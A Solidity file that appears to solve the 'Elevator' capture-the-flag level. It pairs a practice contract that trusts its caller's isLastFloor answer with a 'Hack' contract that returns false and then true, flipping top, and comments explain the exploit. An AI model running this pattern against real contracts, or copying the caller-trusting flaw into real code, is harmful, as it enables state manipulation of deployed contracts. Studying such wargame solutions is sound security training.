// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//GOAL - change top to true in Elevator contract
interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) { //should return false to pass the condition
      floor = _floor;
      top = building.isLastFloor(floor); //should return true to make top true
    }
  }
}


contract Hack {
    uint public count;
    function hack(address _add) public {
        Elevator ele = Elevator(_add);
        ele.goTo(4);
    }
    function isLastFloor(uint x) public returns (bool) {
        count++;
        if(count == 1) return false;
        return true;
    }
}

// Call hack function of Hack contract by passing the address of Elevator contract.
// The above call will change the top variable of Elevator contract to true.
// Reason: hack function calls goTo of Elevator and msg.sender is the address of Hack contract so building 
// variable in goTo function will be an object of Hack contract. 
// Then, isLastFloor of Hack is called two times changing top variable to true.
